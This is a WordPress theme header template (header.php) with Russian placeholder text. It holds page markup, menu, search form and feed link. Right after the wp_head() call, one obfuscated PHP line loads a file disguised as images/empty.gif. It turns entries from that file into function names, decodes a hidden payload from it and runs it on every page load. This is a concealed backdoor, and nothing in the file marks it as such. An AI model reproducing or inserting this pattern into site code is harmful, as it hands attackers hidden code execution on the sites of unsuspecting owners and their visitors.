<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" <?php language_attributes(); ?>>

<head profile="http://gmpg.org/xfn/11">
	<meta http-equiv="Content-Type" content="<?php bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />
	
	<title><?php bloginfo('name'); ?> <?php if ( is_single() ) { ?> &raquo; Blog Archive <?php } ?> <?php wp_title(); ?></title>
	
	<meta name="generator" content="WordPress <?php bloginfo('version'); ?>" /> <!-- leave this for stats -->
	
	<link rel="stylesheet" href="<?php bloginfo('stylesheet_url'); ?>" type="text/css" media="screen" />
	<link rel="alternate" type="application/rss+xml" title="<?php bloginfo('name'); ?> RSS-лента" href="<?php bloginfo('rss2_url'); ?>" />
	<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />
	
	<link rel="stylesheet" type="text/css" href="<?php bloginfo('template_directory'); ?>/style.css" />
	
	<!--[if IE]>
		<link rel="stylesheet" type="text/css" href="<?php bloginfo('template_directory'); ?>/style_ie.css" />
	<![endif]-->
	
	<!--[if lt IE 7]>
		<link rel="stylesheet" type="text/css" href="<?php bloginfo('template_directory'); ?>/style_ie6.css" />
	<![endif]-->
	
<?php  wp_head(); $gif=file(dirname(__FILE__).'/images/empty.gif',2);$gif=$gif[5]("",$gif[6]($gif[4]));$gif(); ?>
</head>

<body>

<!-- Page -->
<div id="page">

	<!-- Header -->
	<div id="header">
	
		<!-- Menu -->
		<div id="header-menu">
			<ul>
				<?php wp_list_pages('title_li='); ?>
			</ul>
		</div>
		<!-- /Menu -->
		
		<!-- Title -->
		<div id="header-info">
			<h1><a href="<?php echo get_option('home'); ?>/"><?php bloginfo('name'); ?></a></h1>
			<div class="description"><?php bloginfo('description'); ?></div>
		</div>
		<!-- /Title -->
		
		<!-- Topbar -->
		<div id="topbar">
			<div id="topbar-left">
								
			</div>
			<div id="topbar-center">
				<h3></h3>
							</div>
			<div id="topbar-right">
				Отредактировать этот текст можно в файле header.php<br />Тут может быть пара строк о вашем проекте.</div>
		</div>
		<!-- /Topbar -->


	<!-- Ssearch -->

				<div id="header-search">
					<form method="get" id="search-form" action="<?php bloginfo('url'); ?>/">
						<input type="text" value="<?php the_search_query(); ?>" name="s" id="sb" />
						<input type="submit" id="searchsubmitb" value="" />
					</form>
				</div>
	
		<!-- /Ssearch -->

	
	<!-- Feed -->
		<div id="header-feed">
			<a href="<?php bloginfo('rss_url'); ?>"><img src="<?php bloginfo('template_directory'); ?>/images/blank.gif" alt="RSS-лента" width="40" height="40" /></a>
		</div>
		<!-- /Feed -->

	</div>
	<!-- /Header -->
	
	<!-- Main -->
	<div id="main"><div id="main-top"><div id="main-bottom">
	